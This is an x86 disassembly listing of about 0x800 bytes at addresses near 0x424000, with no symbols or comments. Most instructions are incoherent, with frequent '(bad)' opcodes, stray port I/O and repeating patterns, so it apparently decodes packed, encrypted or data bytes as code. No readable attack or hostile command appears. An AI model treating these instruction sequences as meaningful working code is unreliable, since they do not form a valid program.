  423e4b:	sub    BYTE PTR [edx-0x80],0x77
  423e4f:	test   DWORD PTR [eax+0x1153f7f0],0xbeb2fc53
  423e59:	or     al,0xb2
  423e5b:	test   BYTE PTR [ecx],ch
  423e5d:	push   DWORD PTR [edx+0x9fdf080]
  423e63:	and    dh,BYTE PTR [edx-0x7f990f80]
  423e69:	xchg   edi,eax
  423e6a:	push   bx
  423e6c:	push   ecx
  423e6d:	push   ebx
  423e6e:	xchg   esp,eax
  423e6f:	mov    dl,0xba
  423e71:	sub    DWORD PTR [edx-0x100f3f9],esi
  423e77:	in     al,dx
  423e78:	mov    dl,0x80
  423e7a:	lock pop esi
  423e7c:	or     eax,esp
  423e7e:	and    edi,ebp
  423e80:	or     BYTE PTR [edi+0x31],0x4d
  423e84:	dec    ebp
  423e85:	dec    ebp
  423e86:	sbb    BYTE PTR [eax],0x31
  423e89:	dec    ebp
  423e8a:	dec    ebp
  423e8b:	dec    ebp
  423e8c:	push   ebx
  423e8d:	cld    
  423e8e:	push   ebx
  423e8f:	xchg   esp,eax
  423e90:	mov    dl,0x84
  423e92:	sub    DWORD PTR [edx-0x400f3f9],esi
  423e98:	in     al,dx
  423e99:	mov    dl,0x9
  423e9b:	loopne 0x423e8d
  423e9d:	lods   al,BYTE PTR ds:[esi]
  423e9e:	push   ebx
  423e9f:	std    
  423ea0:	adc    al,dh
  423ea2:	lods   al,BYTE PTR ds:[esi]
  423ea3:	sub    BYTE PTR [edx-0x71],0x77
  423ea7:	lods   al,BYTE PTR ds:[esi]
  423ea8:	xor    al,0xf7
  423eab:	adc    BYTE PTR [edi+0x535153f7],0x94
  423eb2:	mov    dl,0x7
  423eb4:	or     al,0xb2
  423eb6:	mov    edx,0x80feff29
  423ebb:	xchg   edi,eax
  423ebc:	std    
  423ebd:	or     DWORD PTR [edx],esp
  423ebf:	inc    BYTE PTR [eax-0x11efa169]
  423ec5:	push   cs
  423ec6:	sub    BYTE PTR [edx-0x80],0x77
  423eca:	test   DWORD PTR [eax-0x3ac0810],0x84b21153
  423ed4:	sub    DWORD PTR [edx-0x4d00f342],esi
  423eda:	xor    al,0xfd
  423edd:	or     DWORD PTR [edx],esp
  423edf:	mov    dl,0x80
  423ee1:	lock pop esi
  423ee3:	(bad)  
  423ee4:	out    dx,al
  423ee5:	out    dx,eax
  423ee6:	adc    BYTE PTR [edi-0x54],dh
  423ee9:	sub    BYTE PTR [edx-0x80],0x77
  423eed:	test   DWORD PTR [eax-0x3ac0810],0x532984b2
  423ef7:	adc    DWORD PTR [edx-0x4d00f342],esi
  423efd:	xor    al,0xfd
  423f00:	or     DWORD PTR [edx],esp
  423f02:	mov    dl,0x80
  423f04:	lock push 0xffffff80
  423f07:	xchg   edi,eax
  423f08:	push   0x53
  423f0a:	push   ecx
  423f0b:	push   ebx
  423f0c:	xchg   esp,eax
  423f0d:	mov    dl,0xba
  423f0f:	sub    DWORD PTR [edx-0x100f3f9],esi
  423f15:	in     al,dx
  423f16:	mov    dl,0x80
  423f18:	lock pop esi
  423f1a:	or     eax,esp
  423f1c:	and    edi,ebp
  423f1e:	or     BYTE PTR [edi+0x7d],0x4d
  423f22:	dec    ebp
  423f23:	dec    ebp
  423f24:	sbb    BYTE PTR [eax],0x7d
  423f27:	dec    ebp
  423f28:	dec    ebp
  423f29:	dec    ebp
  423f2a:	push   ebx
  423f2b:	cld    
  423f2c:	push   ebx
  423f2d:	xchg   esp,eax
  423f2e:	mov    dl,0x84
  423f30:	sub    DWORD PTR [edx-0x400f3f9],esi
  423f36:	in     al,dx
  423f37:	mov    dl,0x9
  423f39:	loopne 0x423f2b
  423f3b:	lods   al,BYTE PTR ds:[esi]
  423f3c:	push   ebx
  423f3d:	std    
  423f3e:	adc    al,dh
  423f40:	lods   al,BYTE PTR ds:[esi]
  423f41:	sub    BYTE PTR [edx-0x71],0x77
  423f45:	lods   al,BYTE PTR ds:[esi]
  423f46:	xor    al,0xf7
  423f49:	adc    BYTE PTR [edi+0x535153f7],0x94
  423f50:	mov    dl,0x7
  423f52:	or     al,0xb2
  423f54:	mov    edx,0x80feff29
  423f59:	xchg   edi,eax
  423f5a:	std    
  423f5b:	or     DWORD PTR [edx],esp
  423f5d:	inc    BYTE PTR [eax-0x11efa169]
  423f63:	push   cs
  423f64:	sub    BYTE PTR [edx-0x80],0x77
  423f68:	es xor al,0x26
  423f6c:	push   ebx
  423f6d:	adc    DWORD PTR [ebx-0x4],edx
  423f70:	mov    dl,0xbe
  423f72:	or     al,0xb2
  423f74:	test   BYTE PTR [ecx],ch
  423f76:	push   DWORD PTR [edx-0x7f950f80]
  423f7c:	xchg   edi,eax
  423f7d:	push   0x53
  423f7f:	push   ecx
  423f80:	push   ebx
  423f81:	xchg   esp,eax
  423f82:	mov    dl,0xba
  423f84:	sub    DWORD PTR [edx-0x100f3f9],esi
  423f8a:	or     DWORD PTR [edx],esp
  423f8c:	mov    dl,0xec
  423f8e:	ja     0x423f8d
  423f90:	push   eax
  423f91:	ja     0x423f90
  423f93:	xor    BYTE PTR [edi-0x3],0x80
  423f97:	lock scas eax,DWORD PTR es:[edi]
  423f99:	arpl   bp,di
  423f9b:	or     edx,ebp
  423f9d:	(bad)  
  423f9e:	or     eax,0x77804d4d
  423fa3:	push   0xffffff80
  423fa5:	lock push 0x53
  423fa8:	adc    DWORD PTR [edx-0x3acf342],esi
  423fae:	mov    dl,0x84
  423fb0:	sub    edi,edi
  423fb2:	mov    dl,0x80
  423fb4:	lock scas eax,DWORD PTR es:[edi]
  423fb6:	or     DWORD PTR [edx],esp
  423fb8:	mov    dl,0x80
  423fba:	lock ds push ebx
  423fbd:	push   ecx
  423fbe:	mov    dl,0xba
  423fc0:	sub    edi,edi
  423fc2:	mov    dl,0x80
  423fc4:	lock ds push ebx
  423fc7:	adc    DWORD PTR [edx-0x4d00f342],esi
  423fcd:	push   eax
  423fce:	ja     0x424036
  423fd0:	xor    BYTE PTR [edi-0x7e],0x80
  423fd4:	lock adc BYTE PTR [ebx+0x11],0xb2
  423fd9:	mov    esi,0xb2fc530c
  423fde:	test   BYTE PTR [ecx],ch
  423fe0:	push   DWORD PTR [edx-0x7f7d0f80]
  423fe6:	xchg   edi,eax
  423fe7:	adc    BYTE PTR [ebx+0x51],0xb2
  423feb:	mov    edx,0xb2945329
  423ff0:	pop    es
  423ff1:	or     al,0xff
  423ff3:	(bad)  
  423ff4:	in     al,dx
  423ff5:	lock data16 in al,dx
  423ff8:	std    
  423ff9:	in     al,dx
  423ffa:	lock inc esi
  423ffc:	push   eax
  423ffd:	lock inc esi
  423fff:	les    ebx,FWORD PTR ds:0x80827780
  424005:	lock adc BYTE PTR [ebx-0x4],0x53
  42400a:	adc    DWORD PTR [edx-0x414dd67c],esi
  424010:	or     al,0xff
  424012:	mov    dl,0xec
  424014:	ja     0x42405c
  424016:	push   eax
  424017:	ja     0x42405f
  424019:	xor    BYTE PTR [edi-0x7e],0x80
  42401d:	lock adc BYTE PTR [ebx-0x4],0xb2
  424022:	test   BYTE PTR [ecx],ch
  424024:	push   ebx
  424025:	adc    DWORD PTR [edx-0x4d00f342],esi
  42402b:	xor    al,0x1e
  42402e:	inc    ebx
  42402f:	std    
  424030:	xor    BYTE PTR [edi-0x7e],0x80
  424034:	xchg   edi,eax
  424035:	adc    BYTE PTR [ebx-0x4],0x53
  424039:	xchg   esp,eax
  42403a:	mov    dl,0x7
  42403c:	or     al,0xb2
  42403e:	test   BYTE PTR [ecx],ch
  424040:	(bad)  
  424041:	sti    
  424042:	adc    BYTE PTR [edi-0x4ddf6ba],0x63
  424049:	mov    dl,0x9
  42404b:	dec    esp
  42404c:	xor    cl,BYTE PTR [edx+0x77804d4d]
  424052:	out    dx,eax
  424053:	dec    ebp
  424054:	xlat   BYTE PTR ds:[ebx]
  424055:	and    DWORD PTR [ecx],eax
  424057:	ja     0x423fdf
  424059:	dec    ebp
  42405a:	xlat   BYTE PTR ds:[ebx]
  42405b:	out    dx,eax
  42405c:	or     al,BYTE PTR [eax-0x327f1089]
  424062:	jp     0x42409e
  424064:	lea    ecx,[ebp+0x7780814d]
  42406a:	out    dx,eax
  42406b:	or     ch,0xf7
  42406e:	cmp    cl,BYTE PTR [ebp+0x4d814d8d]
  424074:	xlat   BYTE PTR ds:[ebx]
  424075:	mov    cl,BYTE PTR [ebp-0x29]
  424078:	jbe    0x424000
  42407a:	test   eax,0x508d8def
  42407f:	ja     0x4240e3
  424081:	xor    BYTE PTR [edi-0x75],0x80
  424085:	lock mov edx,DWORD PTR [ebx+0x74]
  424089:	push   ebx
  42408a:	push   ecx
  42408b:	mov    dl,0xba
  42408d:	sub    DWORD PTR [edx-0x4d00f37a],esi
  424093:	xor    al,0x76
  424096:	arpl   WORD PTR [edx+0x778057d5],si
  42409c:	out    dx,eax
  42409d:	xor    al,0x2e
  4240a0:	adc    BYTE PTR [edi+0x32cd802e],0x3a
  4240a7:	lea    ecx,[ebp+0x7e531153]
  4240ad:	mov    dl,0xbe
  4240af:	or     al,0xb2
  4240b1:	clc    
  4240b2:	sub    edi,edi
  4240b4:	(bad)  
  4240b5:	xchg   esi,eax
  4240b6:	xor    al,0x8b
  4240b9:	adc    BYTE PTR [edi+0x5311538b],0x7e
  4240c0:	mov    dl,0xbe
  4240c2:	or     al,0xb2
  4240c4:	clc    
  4240c5:	sub    edi,edi
  4240c7:	(bad)  
  4240c8:	xchg   esi,eax
  4240c9:	dec    ebp
  4240ca:	xlat   BYTE PTR ds:[ebx]
  4240cb:	jbe    0x42411a
  4240cd:	or     bl,BYTE PTR ds:0x70a3a9ab
  4240d3:	sti    
  4240d4:	out    dx,eax
  4240d5:	lea    edx,[edi-0x78127880]
  4240db:	and    eax,0x80328099
  4240e0:	mov    ds:0x8d8d3a2e,al
  4240e5:	in     eax,dx
  4240e6:	pop    ebp
  4240e7:	lea    ecx,[ecx]
  4240e9:	(bad)  
  4240eb:	cmp    cl,BYTE PTR [ebp+0x9724f8d]
  4240f1:	(bad)  
  4240f3:	cmp    cl,BYTE PTR [ebp+0x90b4f8d]
  4240f9:	jne    0x80cfce8c
  4240ff:	dec    esp
  424100:	adc    BYTE PTR [ebp+0x6a4f8d8d],cl
  424106:	or     DWORD PTR [edi],ecx
  424108:	mov    esp,0xed8d8d8d
  42410d:	cli    
  42410e:	inc    ecx
  42410f:	lea    ecx,[ebp+0xf09718d]
  424115:	add    ecx,DWORD PTR [ebp-0x66a07273]
  42411b:	push   ebp
  42411c:	or     DWORD PTR [edi],ecx
  42411e:	mov    dh,0x8d
  424120:	lea    ecx,[ebp+0x3a268e80]
  424126:	lea    ecx,[ebp-0x72cd4813]
  42412c:	cmp    dh,0x43
  42412f:	mov    eax,ds:0x5c09fbec
  424134:	or     ah,BYTE PTR [ecx]
  424136:	push   eax
  424137:	lock stc 
  424139:	or     DWORD PTR [ebp+edi*2-0x5f],ebx
  42413d:	in     al,dx
  42413e:	dec    BYTE PTR [ecx]
  424140:	psadbw mm1,QWORD PTR [ebp+0x7d018d8d]
  424147:	adc    eax,0x86f05093
  42414c:	cli    
  42414d:	dec    ebp
  42414e:	dec    ebp
  42414f:	dec    ebp
  424150:	jmp    0x4240ed
  424152:	dec    edi
  424153:	outs   dx,BYTE PTR ds:[esi]
  424154:	aad    0xeb
  424156:	or     BYTE PTR [esi],0xed
  424159:	mov    bh,0xc8
  42415b:	lea    esi,[ebx]
  42415d:	jle    0x42414b
  42415f:	test   DWORD PTR [ecx],0x9a1e65c
  424165:	pop    esp
  424166:	scas   al,BYTE PTR es:[edi]
  424167:	and    esp,ebp
  424169:	push   es
  42416a:	aad    0xbf
  42416c:	add    edx,ebx
  42416e:	adc    eax,0x4f87f050
  424173:	outs   dx,BYTE PTR ds:[esi]
  424174:	aad    0x92
  424176:	xor    BYTE PTR [eax],0xed
  424179:	mov    bh,0x8b
  42417b:	lea    esi,[ebx]
  42417d:	push   ecx
  42417e:	in     al,dx
  42417f:	std    
  424180:	or     DWORD PTR [edi+ebx*8-0x5f],ebx
  424184:	or     DWORD PTR [edi+ebx*4+0x21],ebx
  424188:	in     al,dx
  424189:	push   es
  42418a:	aad    0x43
  42418c:	add    edi,ebx
  42418e:	adc    eax,0x808ae750
  424193:	out    0x8a,eax
  424195:	sub    BYTE PTR [ebx+0x4f],0x4d
  424199:	aad    0x6f
  42419b:	and    BYTE PTR [edi-0x73dac507],0x9
  4241a2:	pop    esp
  4241a3:	fbld   TBYTE PTR [ecx+0x219f5c09]
  4241a9:	dec    ebp
  4241aa:	ja     0x424137
  4241ac:	in     eax,dx
  4241ad:	ja     0x424139
  4241af:	out    dx,eax
  4241b0:	in     al,dx
  4241b1:	push   es
  4241b2:	pop    edi
  4241b3:	out    0x8b,eax
  4241b5:	in     al,0xa4
  4241b7:	or     DWORD PTR [esi+eiz*8-0x5f],ebx
  4241bb:	or     DWORD PTR [esi+ebp*4+0x21],ebx
  4241bf:	xor    al,0x87
  4241c2:	dec    ebp
  4241c3:	ja     0x42418d
  4241c5:	in     eax,dx
  4241c6:	mov    dl,0xef
  4241c8:	in     al,dx
  4241c9:	push   es
  4241ca:	push   eax
  4241cb:	lock xchg DWORD PTR [edi-0x19],ebx
  4241cf:	enter  0x2ee4,0x80
  4241d3:	lock xchg BYTE PTR [ecx],cl
  4241d6:	pop    esp
  4241d7:	or     ah,BYTE PTR [ecx+0x21dd5c09]
  4241dd:	dec    ebp
  4241de:	ja     0x424212
  4241e0:	in     eax,dx
  4241e1:	mov    dl,0xef
  4241e3:	in     al,dx
  4241e4:	pushf  
  4241e5:	push   eax
  4241e6:	lock xchg BYTE PTR [edi-0x69],bl
  4241ea:	xor    cl,BYTE PTR [ecx]
  4241ec:	jmp    0xa3ab:0x4d4d4d9a
  4241f3:	push   ebx
  4241f4:	push   0x6d
  4241f6:	les    ecx,FWORD PTR [ebx+edx*2]
  4241f9:	push   0xffffffa9
  4241fb:	jo     0x424271
  4241fd:	xchg   edi,eax
  4241fe:	add    BYTE PTR [edi+0x3a2e5080],0x8d
  424205:	lea    eax,[eax-0x7812de89]
  42420b:	jno    0x4241a0
  42420d:	push   ebx
  42420e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42420f:	cdq    
  424210:	fwait
  424211:	pop    edi
  424212:	pop    ds
  424213:	or     DWORD PTR [edi],ecx
  424215:	jmp    0xd574:0x638d8d8d
  42421c:	call   0xd81fdf80
  424221:	das    
  424222:	push   ebx
  424223:	push   0x6d
  424225:	(bad)  
  424226:	fld    DWORD PTR [eax+0x77ecdd6d]
  42422c:	out    dx,eax
  42422d:	cmp    BYTE PTR [ebp+0x25],0x80
  424231:	or     dh,BYTE PTR ds:0x80155280
  424237:	fstp   QWORD PTR ds:0xeceff0ec
  42423d:	xchg   edi,eax
  42423e:	out    dx,eax
  42423f:	push   eax
  424240:	xlat   BYTE PTR ds:[ebx]
  424241:	mov    ah,BYTE PTR [ebx+0x4b]
  424244:	fucomi st,st(4)
  424246:	push   eax
  424247:	out    0x8a,eax
  424249:	push   eax
  42424a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42424b:	mov    ebx,DWORD PTR [edi-0x59]
  42424e:	mov    bl,cl
  424250:	mov    dh,0x63
  424252:	popf   
  424253:	adc    eax,0x5c096fd3
  424258:	push   ebp
  424259:	scas   al,BYTE PTR es:[edi]
  42425a:	les    ecx,FWORD PTR [eax+eax*4]
  42425d:	mov    BYTE PTR [ecx],0x55
  424260:	mov    es,WORD PTR [eax-0x2ab2b097]
  424266:	aas    
  424267:	in     al,dx
  424268:	out    0xef,eax
  42426a:	push   eax
  42426b:	out    0x32,eax
  42426d:	arpl   WORD PTR [ebx-0x587f8e27],cx
  424273:	and    DWORD PTR [eax-0x7d131a5d],eax
  424279:	arpl   WORD PTR [esi],ax
  42427b:	shr    esi,cl
  42427d:	sbb    BYTE PTR [ecx-0x3c],0xef
  424281:	inc    ebx
  424282:	out    0xef,eax
  424284:	push   eax
  424285:	imul   eax,DWORD PTR [eax+0xb4f32d7],0xa780a1d5
  42428f:	mov    esi,DWORD PTR [ebx+0x50]
  424292:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424293:	mov    esp,DWORD PTR [ebx-0x59]
  424296:	mov    ah,ah
  424298:	pop    esi
  424299:	(bad)  
  42429a:	into   
  42429b:	push   ebx
  42429c:	push   0xffffffab
  42429e:	test   eax,0xeffb70a3
  4242a3:	lea    edx,[edi-0x78127880]
  4242a9:	adc    DWORD PTR [ebx+0x24f65e99],0x7750386f
  4242b3:	mov    bh,BYTE PTR [edi+esi*2-0x75]
  4242b7:	cmc    
  4242b8:	and    al,0x6f
  4242ba:	cmp    BYTE PTR [eax-0x587f7510],al
  4242c0:	mov    bl,BYTE PTR [ebx+0x52010de2]
  4242c6:	cmp    dl,BYTE PTR [ebx+0x51]
  4242c9:	mov    dl,0xbe
  4242cb:	or     al,0xab
  4242cd:	push   ebx
  4242ce:	lods   al,BYTE PTR ds:[esi]
  4242cf:	mov    dl,0xb4
  4242d1:	sub    edi,edi
  4242d3:	adc    DWORD PTR [eax-0x10],edx
  4242d6:	xchg   BYTE PTR [eax-0xf7f7510],al
  4242dc:	mov    al,BYTE PTR [eax-0xf7f7510]
  4242e2:	mov    al,BYTE PTR [eax-0xf7f7510]
  4242e8:	mov    al,BYTE PTR [eax-0xf7f7510]
  4242ee:	mov    al,BYTE PTR [eax-0xf7f7510]
  4242f4:	mov    bh,BYTE PTR [edi+esi*2+0x32]
  4242f8:	fsincos 
  4242fa:	lods   al,BYTE PTR ds:[esi]
  4242fb:	pop    eax
  4242fc:	xor    al,0x8a
  4242ff:	and    BYTE PTR [edi+0x53ac538a],0x51
  424306:	mov    dl,0xb4
  424308:	sub    DWORD PTR [edx+0x11ff0cbe],esi
  42430e:	and    BYTE PTR [edi+0x2e248021],0x3a
  424315:	lea    ecx,[ebp+0xf09ff63]
  42431b:	sbb    ah,ch
  42431d:	lea    ecx,[ebp-0x7f750f80]
  424323:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424324:	mov    dl,BYTE PTR [ebx+0x51]
  424327:	push   ebx
  424328:	lods   al,BYTE PTR ds:[esi]
  424329:	mov    dl,0xbe
  42432b:	or     al,0xb2
  42432d:	mov    ah,0x29
  42432f:	call   DWORD PTR [ecx]
  424331:	arpl   si,di
  424333:	or     DWORD PTR [edi],ecx
  424335:	jecxz  0x424323
  424337:	lea    ecx,[ebp-0x72327080]
  42433d:	lea    ecx,[ebp-0x7f756880]
  424343:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424344:	mov    dl,BYTE PTR [ebx+0x7e]
  424347:	push   ebx
  424348:	lods   al,BYTE PTR ds:[esi]
  424349:	mov    dl,0x7
  42434b:	or     al,0xb2
  42434d:	mov    ah,0x29
  42434f:	call   DWORD PTR [ebx+eiz*2-0x6cf0f602]
  424356:	in     al,dx
  424357:	lea    ecx,[ebp+0x50eff0ec]
  42435d:	lock test DWORD PTR [eax-0x7f81ac09],0xb2ac5382
  424368:	pop    es
  424369:	or     al,0xb2
  42436b:	mov    ah,0x29
  42436d:	call   DWORD PTR [eax+edx*2-0x687fcd69]
  424374:	xor    ah,BYTE PTR [ebx-0x9]
  424377:	aad    0x27
  424379:	xor    BYTE PTR [edi-0x76],0x80
  42437d:	xchg   edi,eax
  42437e:	mov    dl,BYTE PTR [ebx-0x64]
  424381:	push   ebx
  424382:	cld    
  424383:	mov    dl,0xf8
  424385:	sub    DWORD PTR [edx-0x400f37a],esi
  42438b:	adc    BYTE PTR [edi+0x1572c332],0x5f
  424392:	out    dx,al
  424393:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424394:	xlat   BYTE PTR ds:[ebx]
  424395:	rol    BYTE PTR [eax-0x687f7589],0x8a
  42439c:	push   ebx
  42439d:	pushf  
  42439e:	push   ebx
  42439f:	cld    
  4243a0:	mov    dl,0xf8
  4243a2:	sub    DWORD PTR [edx-0x400f37a],esi
  4243a8:	adc    BYTE PTR [edi+0x1572c332],0x5f
  4243af:	jne    0x424357
  4243b1:	jno    0x4243bc
  4243b3:	push   gs
  4243b5:	or     al,0x8d
  4243b7:	lea    eax,[eax+0x77808a77]
  4243bd:	mov    al,BYTE PTR [eax+0x77808aa7]
  4243c3:	mov    dl,BYTE PTR [ebx+0x7c]
  4243c6:	push   ebx
  4243c7:	add    al,0xb2
  4243c9:	test   BYTE PTR [ecx],ch
  4243cb:	mov    dl,0xc4
  4243cd:	or     al,0xff
  4243cf:	add    BYTE PTR [eax+0x6ac33277],0x15
  4243d6:	in     al,dx
  4243d7:	mov    dl,0x80
  4243d9:	jge    0x42444c
  4243db:	in     al,dx
  4243dc:	lock out dx,eax
  4243de:	push   eax
  4243df:	lock test BYTE PTR [eax-0x687f7510],al
  4243e6:	mov    dl,BYTE PTR [ebx+0x51]
  4243e9:	push   ebx
  4243ea:	pushf  
  4243eb:	mov    dl,0xbe
  4243ed:	or     al,0xb2
  4243ef:	clc    
  4243f0:	sub    edi,edi
  4243f2:	inc    BYTE PTR [eax-0xfaf7569]
  4243f8:	jp     0x42437a
  4243fa:	out    dx,eax
  4243fb:	push   eax
  4243fc:	lock stc 
  4243fe:	xor    al,0x8a
  424401:	push   ebx
  424402:	jle    0x424457
  424404:	sub    dh,BYTE PTR [edx+0x7b229ba]
  42440a:	or     al,0xff
  42440c:	mov    dh,0x80
  42440e:	lock stc 
  424410:	arpl   si,di
  424412:	aad    0x6f
  424414:	in     al,dx
  424415:	lock out dx,eax
  424417:	push   eax
  424418:	lock jp 0x42439b
  42441b:	lock mov al,BYTE PTR [eax+0x51538a97]
  424422:	push   ebx
  424423:	pushf  
  424424:	mov    dl,0xbe
  424426:	or     al,0xb2
  424428:	clc    
  424429:	sub    edi,edi
  42442b:	(bad)  
  42442c:	in     al,dx
  42442d:	jge    0x424450
  42442f:	jl     0x4244a8
  424431:	xor    cl,0x24
  424434:	outs   dx,DWORD PTR ds:[esi]
  424435:	cmp    ah,ch
  424437:	lock out dx,eax
  424439:	push   eax
  42443a:	lock xchg esp,eax
  42443d:	in     al,dx
  42443e:	xor    al,0x87
  424441:	xor    BYTE PTR [edi+0x21],0x80
  424445:	int    0x32
  424447:	cmp    cl,BYTE PTR [ebp+0x714d968d]
  42444d:	xor    BYTE PTR [edi+0x21],0x4d
  424451:	xlat   BYTE PTR ds:[ebx]
  424452:	xchg   DWORD PTR [eax-0x72c5cd33],eax
  424458:	lea    ecx,[ebp+0xa]
  42445b:	and    DWORD PTR [edi+esi*2-0x7d],edi
  42445f:	add    dl,ch
  424461:	cs jne 0x4244e0
  424464:	ja     0x4243e9
  424466:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424467:	push   ss
  424468:	outs   dx,DWORD PTR ds:[esi]
  424469:	cmp    BYTE PTR [eax-0x687f7510],al
  42446f:	mov    dl,BYTE PTR [ebx+0x51]
  424472:	push   ebx
  424473:	pushf  
  424474:	mov    dl,0xbe
  424476:	or     al,0xb2
  424478:	clc    
  424479:	sub    edi,edi
  42447b:	(bad)  
  42447c:	push   eax
  42447d:	ja     0x424478
  42447f:	arpl   bp,di
  424481:	xlat   BYTE PTR ds:[ebx]
  424482:	pop    ecx
  424483:	xor    BYTE PTR [edi-0x75],0x80
  424487:	lock mov edx,DWORD PTR [ebx-0x4]
  42448b:	push   ebx
  42448c:	sub    dh,BYTE PTR [edx-0x794dd646]
  424492:	or     al,0xff
  424494:	mov    dl,0x80
  424496:	lock add DWORD PTR [eax-0x63ac7c69],0x53
  42449e:	push   ecx
  42449f:	mov    dl,0xf8
  4244a1:	sub    esp,ebp
  4244a3:	add    BYTE PTR [eax-0x327fde89],0x32
  4244aa:	cmp    cl,BYTE PTR [ebp+0xcbeb28d]
  4244b0:	push   DWORD PTR [esi-0x556bddf7]
  4244b6:	dec    ebp
  4244b7:	or     dh,BYTE PTR ds:0x808a7780
  4244bd:	lock mov dl,BYTE PTR [ebx-0x4]
  4244c1:	push   ebx
  4244c2:	sub    dh,BYTE PTR [edx-0x454df37a]
  4244c8:	sub    edi,edi
  4244ca:	mov    dl,0x63
  4244cc:	ja     0x4244c7
  4244ce:	xlat   BYTE PTR ds:[ebx]
  4244cf:	mov    al,0x80
  4244d1:	ja     0x424455
  4244d3:	xor    al,0x82
  4244d6:	push   ebx
  4244d7:	sub    dl,BYTE PTR [ebx-0x4]
  4244da:	mov    dl,0x86
  4244dc:	or     al,0xb2
  4244de:	mov    edx,0x63fdff29
  4244e3:	mov    al,ds:0x4d954c09
  4244e8:	dec    ebp
  4244e9:	dec    ebp
  4244ea:	xor    BYTE PTR [edi-0x76],0x80
  4244ee:	lock mov dl,BYTE PTR [ebx-0x4]
  4244f2:	push   ebx
  4244f3:	sub    dh,BYTE PTR [edx-0x454df37a]
  4244f9:	sub    edi,edi
  4244fb:	mov    dl,0x63
  4244fd:	ja     0x4244f8
  4244ff:	xlat   BYTE PTR ds:[ebx]
  424500:	mov    al,0x80
  424502:	ja     0x42448f
  424504:	xor    al,0x8b
  424507:	push   ebx
  424508:	cld    
  424509:	push   ebx
  42450a:	sub    dh,BYTE PTR [edx-0x454df37a]
  424510:	sub    edi,edi
  424512:	mov    dl,0x3a
  424514:	ja     0x42449c
  424516:	mov    esi,0x8d8d3aae
  42451b:	jl     0x424594
  42451d:	xchg   DWORD PTR [ecx+0x7c66f7ea],esi
  424523:	ja     0x4244ed
  424525:	fld    DWORD PTR [ebp-0x587f12e3]
  42452b:	mov    al,BYTE PTR [eax+0x4538a77]
  424531:	push   ebx
  424532:	jl     0x4244e6
  424534:	les    ecx,FWORD PTR [edx+esi*4]
  424537:	test   BYTE PTR [ecx],ch
  424539:	inc    DWORD PTR [edx-0x72c5e442]
  42453f:	lea    eax,[eax-0xf7f7589]
  424545:	mov    dl,BYTE PTR [ebx-0x4]
  424548:	push   ebx
  424549:	sub    dh,BYTE PTR [edx-0x454df37a]
  42454f:	sub    edi,edi
  424551:	mov    dl,0x50
  424553:	ja     0x4244dc
  424555:	xor    BYTE PTR [edi-0x76],0x80
  424559:	lock mov dl,BYTE PTR [ebx-0x4]
  42455d:	push   ebx
  42455e:	sub    dh,BYTE PTR [edx-0x454df37a]
  424564:	sub    edi,edi
  424566:	mov    dl,0x50
  424568:	ja     0x424532
  42456a:	xor    al,0x8a
  42456d:	xor    BYTE PTR [edi-0x76],0x53
  424571:	push   ecx
  424572:	push   ebx
  424573:	jl     0x424527
  424575:	test   BYTE PTR [ecx],ch
  424577:	mov    dl,0xbe
  424579:	or     al,0xff
  42457b:	std    
  42457c:	xor    BYTE PTR [edi+0x7a],0x63
  424580:	std    
  424581:	aad    0x6f
  424583:	sub    dh,0x1e
  424586:	push   eax
  424587:	ja     0x424510
  424589:	xor    BYTE PTR [edi-0x7c],0x80
  42458d:	out    dx,al
  42458e:	push   ds
  42458f:	push   eax
  424590:	ja     0x42455a
  424592:	xor    BYTE PTR [edi-0x76],0x80
  424596:	lock mov dl,BYTE PTR [ebx-0x4]
  42459a:	push   ebx
  42459b:	sub    dh,BYTE PTR [edx-0x794dd646]
  4245a1:	or     al,0xff
  4245a3:	mov    dl,0x80
  4245a5:	lock xchg DWORD PTR [ebx-0x4e],esp
  4245a9:	aad    0x55
  4245ab:	xor    BYTE PTR [edi-0x76],0x80
  4245af:	lock mov dl,BYTE PTR [ebx+0x2a]
  4245b3:	push   ebx
  4245b4:	cld    
  4245b5:	mov    dl,0xba
  4245b7:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4245bd:	xor    al,0x87
  4245c0:	mov    dl,0xbe
  4245c2:	sub    esp,DWORD PTR [ebx-0x4e]
  4245c5:	aad    0x1d
  4245c7:	xor    al,0x87
  4245ca:	xor    BYTE PTR [edi+0x21],0x80
  4245ce:	int    0x32
  4245d0:	cmp    cl,BYTE PTR [ebp+0x705c098d]
  4245d6:	xchg   esi,eax
  4245d7:	dec    ebp
  4245d8:	xlat   BYTE PTR ds:[ebx]
  4245d9:	stc    
  4245da:	dec    ebp
  4245db:	or     ch,bh
  4245dd:	les    ebx,FWORD PTR [edi]
  4245df:	xor    BYTE PTR [edi-0x38],0xec
  4245e3:	ja     0x4245d4
  4245e5:	xor    al,0x21
  4245e8:	adc    BYTE PTR [eax+0x32],0x3a
  4245ec:	lea    ecx,[ebp+0xa0c6aed]
  4245f2:	dec    ebp
  4245f3:	xlat   BYTE PTR ds:[ebx]
  4245f4:	stc    
  4245f5:	dec    ebp
  4245f6:	xchg   esi,eax
  4245f7:	out    dx,eax
  4245f8:	push   eax
  4245f9:	ja     0x4245c3
  4245fb:	xor    BYTE PTR [edi-0x76],0x80
  4245ff:	lock mov dl,BYTE PTR [ebx-0x4]
  424603:	push   ebx
  424604:	sub    dh,BYTE PTR [edx-0x794dd646]
  42460a:	or     al,0xff
  42460c:	mov    dl,0x80
  42460e:	lock enter 0xb263,0x80
  424613:	ja     0x4245a0
  424615:	xor    al,0x8b
  424618:	xlat   BYTE PTR ds:[ebx]
  424619:	push   cs
  42461a:	push   ebx
  42461b:	cld    
  42461c:	push   ebx
  42461d:	sub    dh,BYTE PTR [edx-0x454df37a]
  424623:	sub    edi,edi
  424625:	mov    dl,0x3a
  424627:	ja     0x4245af
  424629:	les    ebx,FWORD PTR ds:0xfc532a53
  42462f:	mov    dl,0xba
  424631:	sub    DWORD PTR [edx-0x4d00f37a],esi
  424637:	xor    al,0xc8
  42463a:	or     DWORD PTR [edx],esp
  42463c:	mov    dl,0x80
  42463e:	lock test BYTE PTR [eax-0x12],dl
  424642:	and    BYTE PTR [eax-0xf7f7489],al
  424648:	mov    edx,DWORD PTR [ebx-0x4]
  42464b:	push   ebx
